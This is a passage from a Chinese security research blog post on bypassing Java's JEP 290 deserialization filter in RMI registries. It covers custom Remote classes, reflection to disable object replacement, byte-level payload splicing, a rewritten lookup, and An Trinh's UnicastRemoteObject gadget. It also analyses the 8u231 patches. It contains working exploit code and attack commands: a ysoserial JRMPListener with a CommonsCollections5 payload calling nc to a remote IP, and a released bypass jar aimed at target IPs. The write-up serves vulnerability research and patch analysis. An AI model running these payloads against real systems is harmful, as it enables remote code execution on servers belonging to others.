class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//RMIConnectionImpl_Stub走的就是这条路</span></span><br><span class="line">    <span class="keyword">return</span> var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么就很明显了，之前我们觉得只要是remote接口就行了，这个定义有问题，实际上要满足以下两个条件的类我们才能用：</p>
<ol>
<li>是Remote接口</li>
<li>并且是RemoteStub接口</li>
</ol>
<blockquote>
<p>这里的逻辑关系需要倒一下，是Remote 又不是RemoteStub是不行的，又要是Remote的</p>
</blockquote>
<p>那么我们就找到了为啥RMIConnectionImple_Stub可以，但是UnicastRemoteObject不行的原因。</p>
<p>找Remote的继承类就可以轻而易举找到跟RMIConnectionImple_Stub类似的其他类。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17dpwbddj31fc0btmzt.jpg" alt="绕过JEP-remote-满足的类.png"></p>
<p>这些理论都是可以的，就不一一实验了。</p>
<h6 id="新的小问题-RemoteObjectInvocationHandler为啥又可以了"><a href="#新的小问题-RemoteObjectInvocationHandler为啥又可以了" class="headerlink" title="新的小问题-RemoteObjectInvocationHandler为啥又可以了"></a>新的小问题-RemoteObjectInvocationHandler为啥又可以了</h6><p>但是我们又会发现一开始就成功的RemoteObjectInvocationHandler并不满足我们的出来的规定，它是Remote接口但是不是RemoteStub接口呀。</p>
<p>继续调试</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17e29802j31m00qz77a.jpg" alt="绕过JEP-remote-RemoteObjectInvocationHandler.png"></p>
<p>发现虽然它不满足条件进入了if，但是获取到的替换类var2为空，又返回原本的值了。</p>
<p>至于为什么会获取到的结果var2为空，是因为在getTarget中会去内部查询，因为InvocationHandler的特性所以类型转化不到原始类所以为空（胡说八道中，反正跟InvocationHandler脱不了干系）</p>
<p>至此我们就完全搞清楚了找一个带UnicastRef类型参数的实现Remote接口的类的时候需要：</p>
<ol>
<li>这个类它可以填入一个UnicastRef对象（这表示我们的payload可以塞进去）</li>
<li>这个类要是Remote接口的并且是RemoteStub接口</li>
<li>这个类要是Remote接口并且不是RemoteStub接口要是获取不到原来的类也可以，比如RemoteInvocationHandler</li>
</ol>
<h6 id="绕过序列化过程中的替换使所有类均可用于攻击"><a href="#绕过序列化过程中的替换使所有类均可用于攻击" class="headerlink" title="绕过序列化过程中的替换使所有类均可用于攻击"></a>绕过序列化过程中的替换使所有类均可用于攻击</h6><p>从<a href="https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/" target="_blank" rel="noopener">国外老哥的文章</a>中得到的思路。</p>
<p>在分析中我们发现<strong>ObjectOutputStream对象流</strong>中的<strong>enableReplace</strong>全局变量决定了我们的对象是否会被替换：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectOutputStream</span></span></span><br><span class="line"><span class="class">    <span class="keyword">extends</span> <span class="title">OutputStream</span> <span class="keyword">implements</span> <span class="title">ObjectOutput</span>, <span class="title">ObjectStreamConstants</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/** if true, invoke replaceObject() */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> enableReplace;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject0</span><span class="params">(Object obj, <span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	...</span><br><span class="line">        <span class="keyword">if</span> (enableReplace) &#123;<span class="comment">//都是true</span></span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
<p>那么其实我们只要用反射机制，在序列化前把out对象的<strong>enableReplace属性修改为false</strong>就可以了(这需要重新实现bind查询，来进行修改)。大概如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.io.ObjectOutput out = call.getOutputStream();</span><br><span class="line"><span class="comment">//反射修改enableReplace</span></span><br><span class="line">ReflectionHelper.setFieldValue(out, <span class="string">"enableReplace"</span>, <span class="keyword">false</span>);</span><br><span class="line">out.writeObject(obj); <span class="comment">// 写入我们的对象</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>这些绕过我都已经在<a href="https://github.com/wh1t3p1g/ysomap" target="_blank" rel="noopener">ysomap</a>中完成了实现。（没错看到后面，你会发现一开始打算自己做的，然后发现ysomap已经完成了一部分，秉着打不过他就加入他的原则，开始为ysomap添砖加瓦）</p>
</blockquote>
<h5 id="4-带UnicastRef类型参数的实现Remote接口的类—自定义"><a href="#4-带UnicastRef类型参数的实现Remote接口的类—自定义" class="headerlink" title="4.带UnicastRef类型参数的实现Remote接口的类—自定义"></a>4.带UnicastRef类型参数的实现Remote接口的类—自定义</h5><p>但是如果我们回忆之前的出的结论：</p>
<blockquote>
<p>反序列化打服务端，可以使用一个服务端不存在的类。在这个服务端不存在的类的变量中放入payload，这个payload会在服务端反序列化这个不存在的类的时候触发，虽然会报错，但是会触发。</p>
</blockquote>
<p>我们实际上之前做的所有的研究都是无用功，因为我们压根不用去找一个存在于JDK中的类去满足条件来进行攻击，而是自己写一个就可以了。</p>
<p>这个结论让我非常沮丧，我也希望有人告诉我不是这样的，但是实验结果就是如此，他就是可以攻击成功。我甚至打包了没有包含自定义的类的jar放到远程服务器上，但是仍然可以。</p>
<p>实现一个可以序列化的remote接口的类，然后正常攻击</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">lala_remote</span> <span class="keyword">implements</span> <span class="title">Remote</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> RemoteRef ref;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">lala_remote</span><span class="params">(UnicastRef remoteref)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        ref=remoteref;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>可以注意到不是RemoteStub接口，自实现的类会满足上卖弄整理的第三种情况，不会被替换对象。</p>
</blockquote>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17e8s4orj323o0xcqh5.jpg" alt="绕过JEP-remote-自定义.png"></p>
<p>又是报错报着找不到class，但是弹框成功。</p>
<p>远程的（用8u111）。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17ei6nrcj31qk0j0tb6.jpg" alt="绕过JEP-remote-自定义-远程.png"></p>
<p>也是非常有趣，大家都是用已经写好的poc、ysoserial，但实际上…….随便搞搞就可以用了。</p>
<blockquote>
<p>此处为ysomap添加了一个自定义类的模块RMIConnectCustomized，来证明可行性。</p>
</blockquote>
<h4 id="bind的局限性"><a href="#bind的局限性" class="headerlink" title="bind的局限性"></a>bind的局限性</h4><p>好的，重新整理心情。来讨论随便的bind的局限性。</p>
<p>当我们在本地进行试验的时候，使用高于8u141的版本也是可以命令执行的。这会形成一种不受版本限制的错觉。</p>
<p>但实际上在远程攻击的时候，这种攻击是有局限性的。</p>
<ol>
<li>我们把github的代码打包一下，放到远程服务器上，运行靶机<code>java -cp RMIDeserialize.jar com.lala.ServerAndRegister</code>（服务器会有危险）</li>
<li>服务端再起一个JRMP-Listener。<code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 11 CommonsCollections5 &quot;nc 47.102.137.xxx:10000&quot;</code>（用nc来表示命令执行。ps.讲道理不应该在靶机上起一个攻击者的攻击用服务，但是我没有更多的服务器了…）</li>
<li><code>nc -lvvp 10000</code>服务器通过nc监听来判断命令执行是否成功</li>
<li>本地Bypass290代码改成远程攻击端口</li>
<li>运行Bypass290攻击</li>
</ol>
<p>服务器8u131环境成功。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17fk9n04j31b10bin3g.jpg" alt="绕过JEP290-远程测试1.png"></p>
<p>服务器8u161失败</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17g0msfwj325v0jiwid.jpg" alt="绕过JEP290-远程测试8u61.png"></p>
<p>回忆之前的说明，原因同样是bind操作中注册端对于服务端的地址验证。</p>
<p>那么根据之前的结论，我们可以通过lookup来替换bind操作来进行攻击，这样可以绕过bind操作中对于服务端得地址验证。</p>
<h3 id="与RMI客户端反序列化攻击RMI服务端-Lookup结合"><a href="#与RMI客户端反序列化攻击RMI服务端-Lookup结合" class="headerlink" title="与RMI客户端反序列化攻击RMI服务端-Lookup结合"></a>与RMI客户端反序列化攻击RMI服务端-Lookup结合</h3><p>这边参照Barmie的bind攻击思路，使用拦截器来替换攻击包的字节码，来自己重构一个攻击包的字节码。这个思路非常底层和繁琐，但是理论上可以绕过所有客户端限制逻辑。</p>
<h4 id="基于Barmie拦截器的自实现"><a href="#基于Barmie拦截器的自实现" class="headerlink" title="基于Barmie拦截器的自实现"></a>基于Barmie拦截器的自实现</h4><p>我把Barmie的拦截器逻辑拔了出来，放到了Github的RMI-Bypass290项目下。</p>
<p>在Barmie的原逻辑中，拦截器中字节码的拼接非常简单粗暴，他会保留一些包头固定格式，然后修改参数。通常都是直接复制成功的poc的16进制字节码，然后修改其中命令执行的16进制代码，再拼接进入数据包进行发送。比如CC的payload是这样：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> String _header_chunk = <span class="string">"737200116a6176612e757469...."</span>;<span class="comment">//开头的序列化信息</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> String _footer_chunk = <span class="string">"740004657865637571007e00...."</span>;<span class="comment">//结尾的序列化信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//开头塞进去</span></span><br><span class="line">out.write(<span class="keyword">this</span>.fixReferences(<span class="keyword">this</span>.hexStrToByteArray(<span class="keyword">this</span>._header_chunk), refCorrection));</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义添加要执行的String形式的命令</span></span><br><span class="line">out.write(<span class="keyword">this</span>.stringToUtf8ByteArray(cmd));</span><br><span class="line"></span><br><span class="line"><span class="comment">//结尾塞进去</span></span><br><span class="line">out.write(<span class="keyword">this</span>.fixReferences(<span class="keyword">this</span>.hexStrToByteArray(<span class="keyword">this</span>._footer_chunk), refCorrection));</span><br></pre></td></tr></table></figure>
<p>我们的Remote接口的对象原本也可以按照这个思路，找一个成功的数据包，然后修改其中的JRMP服务器回连IP和端口就行了。</p>
<p>但是对比JRMP服务器地址：888.888.888.888:8887、888.888.888.888:8888两次攻击数据包发现：</p>
<p>JRMP服务器回连IP可以简单进行修改，但是端口却是不可以显性直接进行修改的。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17g7sshcj31wj14kdk3.jpg" alt="绕过JEP-remote-自定义-攻击包对比.png"></p>
<p>那么就尝试自己去构造一个序列化对象（由于要与攻击成功数据包进行对比，我们就是用序列化结构更通用的RMIConnectionImpl_Stub类。因为使用自实现类，不同地方包名会不一样不方便）</p>
<p>写完代码后，发现直接序列化不能正常利用攻击，与攻击成功数据包对比发现需要修正000078-&gt;00007078。（这里应该是不同的输入流对象对于序列化的处理不同导致的）</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17gdrr1nj32090ow40n.jpg" alt="绕过JEP-remote-自定义-攻击包对比2.png"></p>
<p>重新微调，在<code>payloads.BypassJEP290_RMIConnectionImpl_Stub#getBytes</code>中进行类实现。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用RMIConnectionImpl_Stub类</span></span><br><span class="line">RMIConnectionImpl_Stub RMIConnectionImpl_Stub_obj = <span class="keyword">new</span> RMIConnectionImpl_Stub(ref);</span><br><span class="line"><span class="comment">//序列化，同时修正000078-&gt;00007078</span></span><br><span class="line"><span class="keyword">byte</span>[] serial_Primary=serialize(RMIConnectionImpl_Stub_obj);</span><br><span class="line"><span class="comment">//除去aced开头（序列化开头）</span></span><br><span class="line"><span class="keyword">byte</span>[] serial_byte= <span class="keyword">new</span> <span class="keyword">byte</span>[serial_Primary.length-<span class="number">4</span>];</span><br><span class="line">System.arraycopy(serial_Primary, <span class="number">4</span>, serial_byte, <span class="number">0</span>, serial_byte.length);</span><br><span class="line"><span class="comment">//填入传输流</span></span><br><span class="line">out.write(<span class="keyword">this</span>.fixReferences(serial_byte));</span><br></pre></td></tr></table></figure>
<p>完毕。打包成jar发布在github的release中了。</p>
<p><code>java -jar RMI-Bypass290.jar 47.xx.xx.xx 1099 47.xx.xx.xx 1199</code>（前者攻击目标IP和端口，后者JRMP服务器IP和端口）直接测试服务端161版本。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17gjbogdj329v17zn66.jpg" alt="绕过JEP-remote-poc验证.png"></p>
<h4 id="重实现lookup逻辑"><a href="#重实现lookup逻辑" class="headerlink" title="重实现lookup逻辑"></a>重实现lookup逻辑</h4><p>虽然工具完成了，但是这么实现着实费劲，一开始以为压根没有人实现这个工具，最后发现wh1tp1g已经集成到他的<a href="https://github.com/wh1t3p1g/ysomap" target="_blank" rel="noopener">ysomap</a>中了（然后打不过他就加入了他= =）.</p>
<p>而且实现的方法更为聪明，只是做了上层lookup函数的重写，这样子就实现起来就很简单简洁，且不用考虑底层字节的各种情况。</p>
<p><code>ysomap.core.exploit.rmi.component.Naming#lookup</code>直接把原来的接口<code>lookup(String)</code>调成<code>lookup(Object)</code>（实现不是如此，逻辑是如此，数据包封装的逻辑实际上直接照搬过来就可以了）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//多加了个registry参数，然后自己实现部分固定值的获取</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title">lookup</span><span class="params">(Registry registry, Object obj)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        RemoteRef ref = (RemoteRef) ReflectionHelper.getFieldValue(registry, <span class="string">"ref"</span>);</span><br><span class="line">        <span class="keyword">long</span> interfaceHash = (<span class="keyword">long</span>) ReflectionHelper.getFieldValue(registry, <span class="string">"interfaceHash"</span>);</span><br><span class="line">        java.rmi.server.Operation[] operations = (Operation[]) ReflectionHelper.getFieldValue(registry, <span class="string">"operations"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        ....<span class="comment">//之后就跟原来的lookup一样了</span></span><br><span class="line">            <span class="comment">//同时这里我还加入了绕过enableReplace，使UnicastRemoteObject可用</span></span><br></pre></td></tr></table></figure>
<h3 id="8u231的修复"><a href="#8u231的修复" class="headerlink" title="8u231的修复"></a>8u231的修复</h3><p>选取了两个版本8u211b12和8u231b11进行测试，使用自定义类的payload模块，8u211可以攻击，8u231不能攻击。</p>
<blockquote>
<p>其中8u231b11版本是从Oracle官网下载的。</p>
<p>如果从openjdk中查找更新的具体版本，那就是8u232b09（感谢wh1t3p1g）</p>
<p>其实一直没搞懂为啥这个版本号的问题，为啥openjdk里没有8u231呢，如果有人知道希望可以回复我谢谢。</p>
</blockquote>
<p>先看测试结果。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17gtcj7cj31af0pmtkp.jpg" alt="8u211测试.png"></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17gxie69j30rf08hq32.jpg" alt="8u231失败.png"></p>
<p>对比JDK做了两处修复：</p>
<ol>
<li><code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>报错情况消除ref</li>
<li><code>sun.rmi.transport.DGCImpl_Stub#dirty</code>提前了黑名单</li>
</ol>
<h4 id="第一处修复"><a href="#第一处修复" class="headerlink" title="第一处修复"></a>第一处修复</h4><blockquote>
<p>在openjdk中可以在线查看对比<a href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/69c4f673b33e/src/share/classes/sun/rmi/registry/RegistryImpl_Skel.java" target="_blank" rel="noopener">8u232u8的RegistryImpl_Skel.java</a>与<a href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5456f24496f4/src/share/classes/sun/rmi/registry/RegistryImpl_Skel.java" target="_blank" rel="noopener">8u232u9的RegistryImpl_Skel.java</a></p>
</blockquote>
<p>其实只有一行的区别，在每个动作比如lookup，bind等中都添加了一个逻辑：<strong>如果出现了序列化报错都会进入catch，执行<code>discardPedingRefs</code></strong>。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17h6iywgj31200b9wf8.jpg" alt="8u231修复第一处.png"></p>
<p>在<code>sun.rmi.transport.StreamRemoteCall#discardPendingRefs</code>中其实也就是做了一件事情，把我们之前装载的<code>incomingRefTable</code>清空</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discardPendingRefs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">this</span>.in.discardRefs();<span class="comment">//去下面</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//sun.rmi.transport.ConnectionInputStream#discardRefs</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">discardRefs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">this</span>.incomingRefTable.clear();<span class="comment">//消除incomingRefTable里面我们的ref</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么很清楚假如我们的payload在序列化中发生了报错，那么我们想尽办法装载的ref就会被干掉。再回头看看我们的那么多种payload都会报错么？</p>
<ol>
<li><p><strong>自定义类（动态代理或接口）</strong>：报错ClassNotFoundException</p>
<p>因为我们传入的类虽然会完成装载，但是在后续的序列化逻辑中肯定是会因为找不到我们的恶意类而发生ClassNotFoundException报错的。</p>
<p>被干掉了。</p>
</li>
<li><p><strong>动态代理转换接口或者找内置接口</strong>：报错ClassCastException</p>
<p>而其他的payload虽然因为都是有内置类的，这些内置类在序列化的时候<code>var9.readObject();</code>是没问题的。</p>
<p>但是这里还有一个类型转换的逻辑<code>var8 = (String)var9.readObject();</code>在类型转换的时候就会发生报错。</p>
<p>从而也被干掉了。</p>
</li>
</ol>
<h4 id="第二处修复"><a href="#第二处修复" class="headerlink" title="第二处修复"></a>第二处修复</h4><p>实际上第一处修复已经完美修复了，但是还有第二处修复针对的是ref被触发的时候，即<code>var7.releaseInputStream();</code></p>
<p>回顾<code>UnicastRef对象</code>这一小节，重新看我们POC触发的调用栈图的左下角，它必定会经过<code>sun.rmi.transport.DGCImpl_Stub#dirty</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17hh2wrsj31nf0twn3i.jpg" alt="纠错第二步.png"></p>
<blockquote>
<p>在openjdk中可以在线查看对比<a href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/69c4f673b33e/src/share/classes/sun/rmi/transport/DGCImpl_Stub.java" target="_blank" rel="noopener">8u232u8的DGCImpl_Stub.java</a>与<a href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5456f24496f4/src/share/classes/sun/rmi/transport/DGCImpl_Stub.java" target="_blank" rel="noopener">8u232u9的DGCImpl_Stub.java</a></p>
</blockquote>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17hpn58uj327l0v3441.jpg" alt="8u231修复第二处.png"></p>
<p>在dirty方法中三个关键语句：</p>
<ol>
<li><code>this.ref.newCall</code>：发起JRMP请求</li>
<li><code>var6.setObjectInputFilter(DGCImpl_Stub::leaseFilter);</code>：过滤</li>
<li><code>this.ref.invoke()</code>：触发JRMP返回payload反序列化解析</li>
</ol>
<p>把过滤器放在解析之前，那么JRMP请求是可以发起的，但是你最后命令执行的payload（比如CC）会被过滤器给干掉。</p>
<p>看下过滤器<code>sun.rmi.transport.DGCImpl_Stub#leaseFilter</code>：一样对长度、深度、黑名单做了限制</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17hwesedj31i10oojt1.jpg" alt="8u231的过滤器.png"></p>
<p>我们的payload用的是CC链，不在白名单范围内，于是GG。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (var1.isPrimitive()) &#123;</span><br><span class="line">    <span class="keyword">return</span> Status.ALLOWED;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> var1 != UID.class &amp;&amp; var1 != VMID.class &amp;&amp; var1 != Lease.class &amp;&amp; (var1.getPackage() == <span class="keyword">null</span> || !Throwable.class.isAssignableFrom(var1) || !<span class="string">"java.lang"</span>.equals(var1.getPackage().getName()) &amp;&amp; !<span class="string">"java.rmi"</span>.equals(var1.getPackage().getName())) &amp;&amp; var1 != StackTraceElement.class &amp;&amp; var1 != ArrayList.class &amp;&amp; var1 != Object.class &amp;&amp; !var1.getName().equals(<span class="string">"java.util.Collections$UnmodifiableList"</span>) &amp;&amp; !var1.getName().equals(<span class="string">"java.util.Collections$UnmodifiableCollection"</span>) &amp;&amp; !var1.getName().equals(<span class="string">"java.util.Collections$UnmodifiableRandomAccessList"</span>) &amp;&amp; !var1.getName().equals(<span class="string">"java.util.Collections$EmptyList"</span>) ? Status.REJECTED : Status.ALLOWED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="来自An-Trinh的另一种绕过JEP290的思路"><a href="#来自An-Trinh的另一种绕过JEP290的思路" class="headerlink" title="来自An Trinh的另一种绕过JEP290的思路"></a>来自An Trinh的另一种绕过JEP290的思路</h2><p>今年2月份，<a href="https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/" target="_blank" rel="noopener">An Trinh的RMI注册端的Bypass方法</a>一文中提出了一种新的Bypass思路，这是一条<strong>与众不同的而又”鸡肋”</strong>的Gadgets。</p>
<blockquote>
<p>上面这句话是一天前年幼无知的我写的，大胆而又无知的说”鸡肋”。一天之后回来想删掉，但是想想还是放着在下面打脸好了。</p>
<p>这条链比之前的都要牛逼可以继续绕过231修复，先按照这个思路看下去，提前膜拜大An Trinh佬。</p>
</blockquote>
<p>为什么要说鸡肋呢，先回顾一下我们之前是如何绕过JEP290的：</p>
<p><strong>攻击者发送payload让RMI注册端发起一个JRMP请求去链接我们的JRMP服务器，然后接受并反序列化我们JRMP服务器返回的报错信息，反序列化的时候通过RMI注册端内部的利用链（比如CC）完成命令执行</strong></p>
<p>An Trinh的绕过思路还是这个套路，JRMP的部分一模一样没有改变，与我们之前不同的是<strong>如何让RMI注册端发起JRMP请求这一部分</strong>。</p>
<p>之前我们提出许多许多攻击方式：绕过客户端-自实现协议去封装、动态代理、UnicastRef类型参数实现Remote接口的类等等、甚至可以自定义一个符合要求的类来攻击。</p>
<p>但是回归到这些攻击方式，其本质都是利用：</p>
<ol>
<li><strong>readobject反序列化的过程会递归反序列化我们的对象，一直反序列化到我们的UnicastRef类。</strong></li>
<li><strong>在readobejct反序列化的过程中填装UnicastRef类到<code>incomingRefTable</code></strong></li>
<li><strong>在releaseInputStream语句中从incomingRefTable中读取ref进行开始JRMP请求</strong></li>
</ol>
<p>(后两步是发起JRMP请求的细节，在 UnicastRef对象 一节中有详细说到，可以粗糙的理解成readobject出发了JRMP查询也没事)</p>
<p>在这个本质的基础上，我们所做的、所解决的问题只是在：选择UnicastRef类包装或者不包装（包装是为了迎合JDK客户端底层的代码）、用jdk中已有的类包装还是自定义类包装，或者用动态代理包装还是原生接口包装，又再是用什么原生接口包装，有的包装不好用怎么办？巴拉巴拉的在处理这些问题。</p>
<hr>
<p>但是An Trinh提出了一个新的思路来发起JRMP请求，不是利用<strong>readobject的递归-填装-触发</strong>的模式，而是<strong>readobject函数调用过程</strong>直接触发JRMP请求。</p>
<p>但是为什么说他鸡肋呢？因为他的payload攻击过程中：会<strong>在readobject函数中触发他的Gadgets发起JRMP连接</strong>，但是在完成后，又会回到我们的<strong>readobject的递归-填装-触发</strong>的模式中发起第二次JRMP连接。具体流程如下：</p>
<ol>
<li><strong>readobject递归反序列化到payload对象中的UnicastRef对象，填装UnicastRef对象的ref到<code>incomingRefTable</code></strong></li>
<li><strong>在根据readobject的第二个最著名的特性：会调用对象自实现的readobject方法，会执行UnicastRemoteObject的readObject，他的Gadgets会在这里触发一次JRMP请求</strong></li>
<li><strong>在releaseInputStream语句中从<code>incomingRefTable</code>中读取ref进行开始JRMP请求</strong></li>
</ol>
<p>同时他Gadgets发起JRMP请求只会发起<strong>一次请求</strong>，而readobject的递归-填装-触发的JRMP请求，由于会检测DGC是否绑定成功会<strong>循环发起JRMP</strong>，形成天然的心跳木马。</p>
<p>那么这样对比看起来这个Gadgets就有一种画蛇添足的感觉，一种混KPI的鸡肋优雅感（<del>天呐一天前的我竟然得出了如此羞耻的结论，辣鸡的傲慢</del>），这就是安全研究员么，爱了爱了。</p>
<p>但是反正让我找我是找不出来的，我们就来膜拜看看他的链在UnicastRemoteObject的readObject中是怎么做到JRMP请求的。</p>
<p>先给出ysomap里的封装过程：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> UnicastRemoteObject <span class="title">pack</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//1.UnicastRef对象 -&gt; RemoteObjectInvocationHandler</span></span><br><span class="line">    <span class="comment">//obj是UnicastRef对象，先RemoteObjectInvocationHandler封装</span></span><br><span class="line">    RemoteObjectInvocationHandler handler = <span class="keyword">new</span> RemoteObjectInvocationHandler((RemoteRef) obj);</span><br><span class="line">    <span class="comment">//2. RemoteObjectInvocationHandler -&gt; RMIServerSocketFactory接口</span></span><br><span class="line">    <span class="comment">//RemoteObjectInvocationHandler通过动态代理封装转化成RMIServerSocketFactory</span></span><br><span class="line">    RMIServerSocketFactory serverSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(</span><br><span class="line">        RMIServerSocketFactory.class.getClassLoader(),<span class="comment">// classloader</span></span><br><span class="line">        <span class="keyword">new</span> Class[] &#123; RMIServerSocketFactory.class, Remote.class&#125;, <span class="comment">// interfaces to implements</span></span><br><span class="line">        handler<span class="comment">// RemoteObjectInvocationHandler</span></span><br><span class="line">        );</span><br><span class="line">    <span class="comment">//通过反射机制破除构造方法的可见性性质，创建UnicastRemoteObject实例</span></span><br><span class="line">    Constructor&lt;?&gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor(<span class="keyword">null</span>); <span class="comment">// 获取默认的</span></span><br><span class="line">    constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    UnicastRemoteObject remoteObject = (UnicastRemoteObject) constructor.newInstance(<span class="keyword">null</span>);</span><br><span class="line">    <span class="comment">//3. RMIServerSocketFactory -&gt; UnicastRemoteObject</span></span><br><span class="line">    <span class="comment">//把RMIServerSocketFactory塞进UnicastRemoteObject实例中</span></span><br><span class="line">    ReflectionHelper.setFieldValue(remoteObject, <span class="string">"ssf"</span>, serverSocketFactory);</span><br><span class="line">    <span class="keyword">return</span> remoteObject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看下漏洞触发调用栈，主要分成三个关键点：</p>
